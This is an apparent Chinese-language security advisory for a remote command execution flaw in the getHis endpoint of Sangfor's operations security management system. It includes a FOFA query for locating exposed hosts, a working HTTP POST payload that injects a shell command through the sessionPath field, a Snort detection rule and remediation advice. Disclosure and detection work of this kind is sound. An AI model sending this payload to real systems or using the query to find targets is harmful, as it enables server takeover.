# 深信服运维安全管理系统 getHis 远程代码执行漏洞

深信服运维安全管理系统 getHis 远程代码执行漏洞，攻击者可执行任意命令导致服务器被控。

# 影响版本

深信服运维安全管理系统

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：body="/fort/login" && header="FORTSESSIONID"

POC/EXP：

```
POST /isomp-protocol/protocol/getHis HTTP/1.1
Host: 127.0.0.1
Accept-Encoding: gzip
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1

sessionPath=;id>/usr/local/tomcat/webapps/isomp-protocol/okm.txt;&sid=1
```

![image-20260122155728442](assets/image-20260122155728442.png)

![image-20260122155752395](assets/image-20260122155752395.png)

sonrt规则：

```
alert http any any -> $HOME_NET any (
    msg:"深信服运维安全管理系统 - Remote Command Execution via getHis (CVE-2025-XXXX)";
    flow:to_server,established;
    http.method; content:"POST";
    http.uri; content:"/isomp-protocol/protocol/getHis";
    http.header; content:"Content-Type: application/x-www-form-urlencoded; charset=UTF-8";
    http.request_body; content:"sessionPath=";
    http.request_body; pcre:"/sessionPath=[^&]*;[^&]*>&sid=/i";
    metadata:
        cve none,
        service http,
        affected_product "深信服运维安全管理系统",
        vulnerability_type "Remote Command Execution",
        severity "critical";
    classtype:web-application-attack;
    sid:1000581;
    rev:1;
    priority:1;
)
```

# 漏洞修复

关闭互联网暴露面或接口设置访问权限，升级至安全版本。
